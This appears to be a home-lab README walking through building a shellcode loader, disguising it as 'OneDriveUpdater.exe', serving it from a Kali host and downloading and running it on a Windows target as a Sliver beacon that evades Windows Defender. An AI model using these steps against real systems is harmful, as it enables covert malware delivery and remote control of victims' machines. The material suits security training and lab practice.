# Windows Steps

You will need a relatively new Windows machine to use Visual Studio 2022.

I used the Eval ISO downloaded as mentioned in my repo "active-directory" to create a Windows 11 VM with the following settings:
- 4 CPUs
- 8 GB RAM
- 120 GB Disk

You will need to perform the steps to bypass the TPM stuff as documented in the "active-directoy" repo steps.

Then do the usual Update/restart steps to bring it current.

Install Visual Studio 2022 Community.

Follow the steps from @xct video [Vulnlab | Wutai: Writing a Loader & Getting a Beacon](https://www.youtube.com/watch?v=dShZR6FUV2w) starting at 3:43 for creating the wutai_loader.

I have recreated his solution file, but I named my version "wutai_loader" whereas he called his "wutai_loader_youtube". The code is identical. You can just import my "solution". Just follow along on how he configures, selects compiler and linker options and builds as a release (not debug) using Visual Studio.

Make sure you don't open the "data.asm" file in Visual Studio as the file is very large and it may hang.

The data.asm file is created by pasting the output from our Kali Linux steps using "Notepad.exe"

Build it. Once the build completes successfully it should be called "wutai_loader.exe" and it will be located in the x64/Release directory. 

In the video, @xct renamed it "OneDriveUpdater.exe" so it didn't look suspicious. He transfered it back to Kali where he staged it as a downloadable file (sudo python3 -m http.server).

---
Then on our Active Directory Windows workstation "target" you can now download it via:
```
open command window
cd C:\windows\tasks
C:\windows\tasks>powershell
PS C:\Wndows\Tasks> iwr http://<Kali IP>/OneDriveUpdater.exe -o OneDriveUpdater.exe
```

It should download without and interferance from Windows Defender.

---
Before you run the command, Back on Kali, make sure you have sliver running and it is in http mode:
```
sliver > http
```
---
Now back on the Windows target, execute the beacon implant:
```
PS C:\Wndows\Tasks> .\OneDriveUpdater.exe
```
Windows Defender realime does not block it !

---
Now on Kali sliver, we should see our beacon call back !!!

---
END
